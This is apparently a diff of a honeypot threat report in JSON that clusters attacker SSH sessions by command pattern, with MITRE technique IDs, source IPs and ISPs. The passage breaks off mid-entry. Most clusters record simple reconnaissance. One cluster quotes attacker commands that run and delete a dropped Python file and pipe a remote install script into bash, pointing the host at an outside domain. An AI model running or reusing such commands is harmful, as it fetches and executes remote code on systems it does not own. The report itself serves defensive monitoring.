@@ -1,17 +1,17 @@
 {
-  "generated_at": "2026-08-29T23:57:57.107153+00:00",
-  "total_sessions_with_commands": 15,
-  "total_clusters": 3,
-  "campaign_clusters": 1,
-  "singleton_clusters": 1,
+  "generated_at": "2026-09-09T08:49:58.089476+00:00",
+  "total_sessions_with_commands": 565,
+  "total_clusters": 16,
+  "campaign_clusters": 3,
+  "singleton_clusters": 10,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-001",
+      "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 12,
-      "unique_ip_count": 12,
+      "session_count": 5,
+      "unique_ip_count": 5,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -19,11 +19,85 @@
         "T1140",
         "T1105"
       ]
+    },
+    {
+      "cluster_id": "CLU-015",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1070",
+        "T1140",
+        "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-016",
+      "name": "Recon Loader Script",
+      "severity": "MEDIUM",
+      "session_count": 6,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1082",
+        "T1592",
+        "T1078",
+        "T1083"
+      ]
     }
   ],
   "clusters": [
     {
       "cluster_id": "CLU-001",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "165.1.75.106"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "d2af147dd3fa2817",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "representative_commands": [
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+      ],
+      "members": [
+        {
+          "session_id": "IR-4f604dce2353",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-09-09T06:22:30.555766Z"
+        },
+        {
+          "session_id": "IR-5c807400662f",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-09-09T06:24:46.190145Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -42,22 +116,15 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 12,
+      "session_count": 5,
       "unique_ips": [
-        "103.146.159.173",
-        "49.207.241.187",
-        "172.160.227.37",
-        "36.64.131.68",
-        "155.94.155.107",
-        "54.36.99.29",
-        "154.83.196.237",
-        "103.159.54.61",
-        "104.199.176.250",
-        "180.93.172.213",
-        "51.77.213.203",
-        "171.25.158.74"
+        "209.38.69.12",
+        "118.193.45.134",
+        "175.6.109.238",
+        "81.192.46.36",
+        "152.169.164.2"
       ],
-      "unique_ip_count": 12,
+      "unique_ip_count": 5,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -87,142 +154,44 @@
       ],
       "members": [
         {
-          "session_id": "IR-b994e14f7bfa",
-          "src_ip": "103.159.54.61",
-          "country": "VN",
-          "isp": "HT3 VIETNAM TECHNOLOGY INVESTMENT AND DEVELOPMENT JOINT STOCK COMPANY",
+          "session_id": "IR-9c7398d7fb5f",
+          "src_ip": "81.192.46.36",
+          "country": "MA",
+          "isp": "Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM",
           "command_count": 2,
-          "timestamp": "2026-08-29T19:35:55.360142Z"
+          "timestamp": "2026-09-09T03:00:27.235148Z"
         },
         {
-          "session_id": "IR-a831080acd7e",
-          "src_ip": "172.160.227.37",
-          "country": "SE",
-          "isp": "Microsoft Limited",
+          "session_id": "IR-f6733d1996da",
+          "src_ip": "152.169.164.2",
+          "country": "AR",
+          "isp": "Telecom Argentina S.A.",
           "command_count": 2,
-          "timestamp": "2026-08-29T19:45:04.440747Z"
+          "timestamp": "2026-09-09T04:19:03.781189Z"
         },
         {
-          "session_id": "IR-e6cd12b9a780",
-          "src_ip": "180.93.172.213",
-          "country": "VN",
-          "isp": "Saigon Postel Corporation",
-          "command_count": 2,
-          "timestamp": "2026-08-29T19:47:10.573520Z"
-        },
-        {
-          "session_id": "IR-26ddcab7c9c8",
-          "src_ip": "171.25.158.74",
-          "country": "SE",
-          "isp": "Vaxjo NET C2IP",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:07:44.066750Z"
-        },
-        {
-          "session_id": "IR-4ba4eda1ad18",
-          "src_ip": "51.77.213.203",
-          "country": "FR",
-          "isp": "OVH SAS",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:09:45.959560Z"
-        },
-        {
-          "session_id": "IR-6c1abc523dde",
-          "src_ip": "154.83.196.237",
-          "country": "RU",
-          "isp": "UCLOUD INFORMATION TECHNOLOGY HK LIMITED",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:10:34.168576Z"
-        },
-        {
-          "session_id": "IR-3111c1f27809",
-          "src_ip": "36.64.131.68",
-          "country": "ID",
-          "isp": "PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:11:23.942725Z"
-        },
-        {
-          "session_id": "IR-b2c8570640a6",
-          "src_ip": "104.199.176.250",
-          "country": "TW",
-          "isp": "Google LLC",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:11:26.389964Z"
-        },
-        {
-          "session_id": "IR-c00dac23b954",
-          "src_ip": "49.207.241.187",
-          "country": "IN",
-          "isp": "Beam Telecom Pvt Ltd",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:19:25.257654Z"
-        },
-        {
-          "session_id": "IR-0962aa6a1183",
-          "src_ip": "103.146.159.173",
-          "country": "HK",
-          "isp": "HK KXSY TECHNOLOGY CO.,LIMITED",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:21:51.037537Z"
-        },
-        {
-          "session_id": "IR-98107a33a68d",
-          "src_ip": "155.94.155.107",
+          "session_id": "IR-9fb61949b214",
+          "src_ip": "209.38.69.12",
           "country": "US",
-          "isp": "HostPapa",
+          "isp": "DigitalOcean, LLC",
           "command_count": 2,
-          "timestamp": "2026-08-29T22:23:36.724529Z"
+          "timestamp": "2026-09-09T04:21:23.062801Z"
         },
         {
-          "session_id": "IR-961460fcddd2",
-          "src_ip": "54.36.99.29",
-          "country": "FR",
-          "isp": "OVH SAS",
-          "command_count": 2,
-          "timestamp": "2026-08-29T22:26:08.933197Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "182.92.242.181",
-        "95.182.83.99"
-      ],
-      "unique_ip_count": 2,
-      "sequence_hash": "6fa4c8ac58e7a1d9",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        }
-      ],
-      "representative_commands": [
-        "uname -s -m"
-      ],
-      "members": [
-        {
-          "session_id": "IR-303de85bdfe2",
-          "src_ip": "95.182.83.99",
-          "country": "FR",
-          "isp": "Cloud Software - FZCO",
-          "command_count": 1,
-          "timestamp": "2026-08-29T19:27:38.861574Z"
-        },
-        {
-          "session_id": "IR-90dd2137a98a",
-          "src_ip": "182.92.242.181",
+          "session_id": "IR-d0ab3a4b4094",
+          "src_ip": "175.6.109.238",
           "country": "CN",
-          "isp": "Aliyun Computing Co., LTD",
-          "command_count": 1,
-          "timestamp": "2026-08-29T20:20:12.752547Z"
+          "isp": "CHINANET HUNAN PROVINCE NETWORK",
+          "command_count": 2,
+          "timestamp": "2026-09-09T05:59:54.320755Z"
+        },
+        {
+          "session_id": "IR-c901909c9180",
+          "src_ip": "118.193.45.134",
+          "country": "HK",
+          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+          "command_count": 2,
+          "timestamp": "2026-09-09T06:20:37.849703Z"
         }
       ]
     },
@@ -234,6 +203,410 @@
       "campaign_description": null,
       "matched_campaigns": [],
       "session_count": 1,
+      "unique_ips": [
+        "152.32.245.44"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "75264fc05d188f70",
+      "ttps": [],
+      "representative_commands": [
+        "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
+        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+      ],
+      "members": [
+        {
+          "session_id": "IR-dfc9fe9a322a",
+          "src_ip": "152.32.245.44",
+          "country": "TH",
+          "isp": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+          "command_count": 2,
+          "timestamp": "2026-09-09T03:29:53.549785Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "34.77.228.236"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6c2b02475f4c7e7e",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-8191bbf4a1f4",
+          "src_ip": "34.77.228.236",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-09-09T03:31:17.953681Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 40,
+      "unique_ips": [
+        "27.71.237.12",
+        "81.169.219.15"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "28ba533b0f3c4df6",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -a"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c1eee5496fe7",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T02:57:06.408181Z"
+        },
+        {
+          "session_id": "IR-3bec365c05af",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:03:25.836932Z"
+        },
+        {
+          "session_id": "IR-5d48522362b7",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:09:40.477582Z"
+        },
+        {
+          "session_id": "IR-9fc1f38a30ef",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:15:52.488880Z"
+        },
+        {
+          "session_id": "IR-cdba7acab79d",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:22:03.582919Z"
+        },
+        {
+          "session_id": "IR-add22491dff4",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:28:12.536004Z"
+        },
+        {
+          "session_id": "IR-b0ae4920c9bd",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:34:22.403760Z"
+        },
+        {
+          "session_id": "IR-2feb68a4ed2b",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:40:35.910061Z"
+        },
+        {
+          "session_id": "IR-8bb81aa348de",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:46:48.682099Z"
+        },
+        {
+          "session_id": "IR-813132e95368",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:53:00.754714Z"
+        },
+        {
+          "session_id": "IR-2870cc2f42ec",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:59:12.991400Z"
+        },
+        {
+          "session_id": "IR-c600880225e7",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:05:29.257739Z"
+        },
+        {
+          "session_id": "IR-4765c5bab726",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:11:43.776160Z"
+        },
+        {
+          "session_id": "IR-686e22190139",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:17:51.807150Z"
+        },
+        {
+          "session_id": "IR-e0af5ca8731b",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:24:00.374093Z"
+        },
+        {
+          "session_id": "IR-b75124aeec8e",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:30:10.318295Z"
+        },
+        {
+          "session_id": "IR-f2ce41875a6c",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:36:25.569988Z"
+        },
+        {
+          "session_id": "IR-110064f0680d",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:42:39.081724Z"
+        },
+        {
+          "session_id": "IR-6efe538a1f9f",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:48:56.163912Z"
+        },
+        {
+          "session_id": "IR-23164ea7d58d",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:55:09.552299Z"
+        },
+        {
+          "session_id": "IR-c9d9168193be",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:01:24.778914Z"
+        },
+        {
+          "session_id": "IR-4ddd8693d902",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:07:35.691612Z"
+        },
+        {
+          "session_id": "IR-83222b5fd915",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:13:48.345106Z"
+        },
+        {
+          "session_id": "IR-13badea2a1d1",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:19:57.775313Z"
+        },
+        {
+          "session_id": "IR-0909d73b935a",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:26:09.305746Z"
+        },
+        {
+          "session_id": "IR-9114105d1dc5",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:32:17.579882Z"
+        },
+        {
+          "session_id": "IR-5f831eb18028",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:38:26.114618Z"
+        },
+        {
+          "session_id": "IR-2f6c20865c06",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:44:40.315511Z"
+        },
+        {
+          "session_id": "IR-a8bec2ede305",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:50:52.862146Z"
+        },
+        {
+          "session_id": "IR-9fe3f940145a",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:57:02.737092Z"
+        },
+        {
+          "session_id": "IR-6720e7955bf4",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:03:16.350973Z"
+        },
+        {
+          "session_id": "IR-745aefc59f93",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:09:28.261080Z"
+        },
+        {
+          "session_id": "IR-7255d99aed1b",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:15:37.423248Z"
+        },
+        {
+          "session_id": "IR-dcd99a2f378f",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:21:47.761036Z"
+        },
+        {
+          "session_id": "IR-2b68b2b52943",
+          "src_ip": "27.71.237.12",
+          "country": "VN",
+          "isp": "Viettel Group",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:27:11.684568Z"
+        },
+        {
+          "session_id": "IR-08c8efa098a9",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:27:58.214499Z"
+        },
+        {
+          "session_id": "IR-1257f43ecfe4",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:34:07.999208Z"
+        },
+        {
+          "session_id": "IR-23fd317e1e2f",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:40:26.005869Z"
+        },
+        {
+          "session_id": "IR-c5383faf1dbf",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:46:39.034904Z"
+        },
+        {
+          "session_id": "IR-b6e90a2c00b6",
+          "src_ip": "81.169.219.15",
+          "country": "DE",
+          "isp": "Strato Rechenzentrum, Berlin",
+          "command_count": 1,
+          "timestamp": "2026-09-09T06:52:50.364618Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
       "unique_ips": [
         "130.12.180.51"
       ],
@@ -250,12 +623,4423 @@
       ],
       "members": [
         {
-          "session_id": "IR-96f2ec8a2b73",
+          "session_id": "IR-fe7c21099071",
           "src_ip": "130.12.180.51",
           "country": "DE",
           "isp": "Virtualine Technologies",
           "command_count": 1,
-          "timestamp": "2026-08-29T22:08:35.693096Z"
+          "timestamp": "2026-09-09T02:59:14.354270Z"
+        },
+        {
+          "session_id": "IR-e3ea9b45a459",
+          "src_ip": "130.12.180.51",
+          "country": "DE",
+          "isp": "Virtualine Technologies",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:42:33.052756Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "107.174.181.21"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-01b774e6d147",
+          "src_ip": "107.174.181.21",
+          "country": "US",
+          "isp": "RackNerd LLC",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:27:33.517540Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-008",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "34.77.228.236"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "758d61f26a444483",
+      "ttps": [],
+      "representative_commands": [
+        "PING"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f7f97c043a6e",
+          "src_ip": "34.77.228.236",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:31:31.337388Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-009",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.71.237.12"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "f25297859cf0a70a",
+      "ttps": [],
+      "representative_commands": [
+        "whoami"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f84dcc18d3fb",
+          "src_ip": "27.71.237.12",
+          "country": "VN",
+          "isp": "Viettel Group",
+          "command_count": 1,
+          "timestamp": "2026-09-09T03:47:05.138573Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-010",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.71.237.12"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "3b6409aecd4af0f8",
+      "ttps": [],
+      "representative_commands": [
+        "history | tail -5"
+      ],
+      "members": [
+        {
+          "session_id": "IR-2291a5dead6f",
+          "src_ip": "27.71.237.12",
+          "country": "VN",
+          "isp": "Viettel Group",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:10:21.092288Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-011",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.71.237.12"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "f03826b87738be78",
+      "ttps": [],
+      "representative_commands": [
+        "netstat -tulpn | head -10"
+      ],
+      "members": [
+        {
+          "session_id": "IR-f9586244cfed",
+          "src_ip": "27.71.237.12",
+          "country": "VN",
+          "isp": "Viettel Group",
+          "command_count": 1,
+          "timestamp": "2026-09-09T04:51:56.073498Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-012",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "27.71.237.12"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "32fbe00e2c2e4036",
+      "ttps": [],
+      "representative_commands": [
+        "ssh -V"
+      ],
+      "members": [
+        {
+          "session_id": "IR-b50c2f9a85dc",
+          "src_ip": "27.71.237.12",
+          "country": "VN",
+          "isp": "Viettel Group",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:38:29.944402Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-013",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 500,
+      "unique_ips": [
+        "109.160.32.108"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7ab552f01de999cb",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-22c5643c9110",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:55:33.264432Z"
+        },
+        {
+          "session_id": "IR-0e8c13209bd4",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:55:38.613955Z"
+        },
+        {
+          "session_id": "IR-9f088c85f8c7",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:55:43.741000Z"
+        },
+        {
+          "session_id": "IR-05725d3d4557",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:55:48.514074Z"
+        },
+        {
+          "session_id": "IR-ce40bd20f5e2",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:55:53.151068Z"
+        },
+        {
+          "session_id": "IR-ace274d15681",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:55:57.733293Z"
+        },
+        {
+          "session_id": "IR-a2069f3f2433",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:02.262035Z"
+        },
+        {
+          "session_id": "IR-b78569978448",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:07.041061Z"
+        },
+        {
+          "session_id": "IR-14ec37fc4415",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:12.025937Z"
+        },
+        {
+          "session_id": "IR-434887738f0a",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:17.007672Z"
+        },
+        {
+          "session_id": "IR-d5b39a817790",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:21.762800Z"
+        },
+        {
+          "session_id": "IR-34b3d5df03c8",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:26.709539Z"
+        },
+        {
+          "session_id": "IR-23ff00fd9b00",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:31.586710Z"
+        },
+        {
+          "session_id": "IR-c84cec958419",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:36.491513Z"
+        },
+        {
+          "session_id": "IR-ec739ee48bfb",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:41.623112Z"
+        },
+        {
+          "session_id": "IR-57ffa6e41f75",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:46.889191Z"
+        },
+        {
+          "session_id": "IR-034c6e477ea0",
+          "src_ip": "109.160.32.108",
+          "country": "BG",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-09-09T05:56:51.781968Z"
+        },
+        {
+          "session_id": "IR-f27dcedb56e4",
+          "src_ip": "109.160.32.108",
